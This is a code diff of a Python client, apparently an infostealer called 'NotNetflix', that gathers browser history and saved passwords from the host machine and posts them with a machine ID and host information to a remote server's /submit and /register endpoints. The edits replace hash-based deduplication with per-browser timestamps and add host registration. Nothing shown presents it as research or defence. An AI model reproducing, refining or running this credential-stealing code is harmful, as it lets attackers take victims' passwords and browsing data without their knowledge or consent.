@@ -20,29 +20,34 @@ import browser_cookie3
 # ========== CONFIG ==========
 SERVER_URL = "http://localhost:5000"
 INTERVAL = 60
-if platform.system() == "Windows":
-    MACHINE_ID_FILE = os.path.join(os.getenv("APPDATA"), "machine", "id")
-else:
-    MACHINE_ID_FILE = os.path.expanduser("~/.machine_id")
+MACHINE_ID_FILE = os.path.expanduser("~/.machine_id")
 
 if platform.system() == "Windows":
-    CACHE_PATH = os.path.join(os.getenv("APPDATA"), "NotNetflix", "sent.json")
+    CACHE_PATH = os.path.join(os.getenv("APPDATA"), "NotNetflix", "last_sent.json")
 else:
-    CACHE_PATH = os.path.expanduser("~/.cache/not_netflix_sent.json")
+    CACHE_PATH = os.path.expanduser("~/.cache/not_netflix_last_sent.json")
 
-# ========== DEDUPLICATION CACHE ==========
-def load_sent_cache():
+def load_last_sent_times():
     try:
         with open(CACHE_PATH, "r") as f:
-            return set(json.load(f))
+            return json.load(f)
     except:
-        return set()
+        return {}
 
-def save_sent_cache(cache_set):
+def save_last_sent_times(data):
     os.makedirs(os.path.dirname(CACHE_PATH), exist_ok=True)
     with open(CACHE_PATH, "w") as f:
-        json.dump(list(cache_set), f)
+        json.dump(data, f)
 
+def should_send(entry, last_sent_times):
+    btype = entry.get("browser_type")
+    if not btype:
+        return False
+    last_time = last_sent_times.get(btype)
+    current_time = entry.get("visit_time")
+    if not current_time:
+        return True  # credentials have no visit_time, always send once
+    return not last_time or current_time > last_time
 
 # ========== IDENTIFIER ==========
 def get_machine_id():
@@ -241,61 +246,48 @@ def get_ip_address():
                 return entry.address
     return "0.0.0.0"
 
-# ========== Multiple Data Check ========
-_sent_hashes = set()
-
-def hash_entry(entry):
-    return hashlib.sha256(repr(entry).encode()).hexdigest()
-
-def is_duplicate(entry):
-    h = hash_entry(entry)
-    if h in _sent_hashes:
-        return True
-    _sent_hashes.add(h)
-    return False
+def register():
+    try:
+        info = get_host_info()
+        requests.post(f"{SERVER_URL}/register", json=info, timeout=10)
+    except Exception as e:
+        print(f"[ERROR] Register failed: {e}")
 
 # ========== COMMUNICATION ==========
 def send_data_once():
     try:
-        cache = load_sent_cache()
-        new_cache = set(cache)
+        last_sent = load_last_sent_times()
+        updated = dict(last_sent)
+        register()
 
         # === History ===
         history = get_browser_history()
-        filtered_history = []
-        for h in history:
-            key = f"{h['url']}_{h['visit_time']}_{h['browser_type']}"
-            h_hash = hashlib.sha256(key.encode()).hexdigest()
-            if h_hash not in cache:
-                filtered_history.append(h)
-                new_cache.add(h_hash)
-
+        filtered_history = [h for h in history if should_send(h, last_sent)]
         if filtered_history:
             requests.post(f"{SERVER_URL}/submit/history", json={
                 "machine_id": MACHINE_ID,
                 "history": filtered_history
             }, timeout=10)
+            for h in filtered_history:
+                b = h['browser_type']
+                updated[b] = max(updated.get(b, ""), h['visit_time'])
 
         # === Credentials ===
         credentials = get_saved_credentials()
-        filtered_credentials = []
-        for c in credentials:
-            key = f"{c['website']}_{c['username']}_{c['browser_type']}"
-            c_hash = hashlib.sha256(key.encode()).hexdigest()
-            if c_hash not in cache:
-                filtered_credentials.append(c)
-                new_cache.add(c_hash)
-
-        if filtered_credentials:
+        filtered_creds = [c for c in credentials if should_send(c, last_sent)]
+        if filtered_creds:
             requests.post(f"{SERVER_URL}/submit/credentials", json={
                 "machine_id": MACHINE_ID,
-                "credentials": filtered_credentials
+                "credentials": filtered_creds
             }, timeout=10)
+            for c in filtered_creds:
+                b = c['browser_type']
+                updated[b] = datetime.utcnow().isoformat()  # credentials have no timestamp
 
-        save_sent_cache(new_cache)
+        save_last_sent_times(updated)
 
-    except requests.RequestException:
-        pass
+    except requests.RequestException as e:
+        print(f"[ERROR] Send failed: {e}")
 
 # ========== RUNNER ==========
 def main_loop():
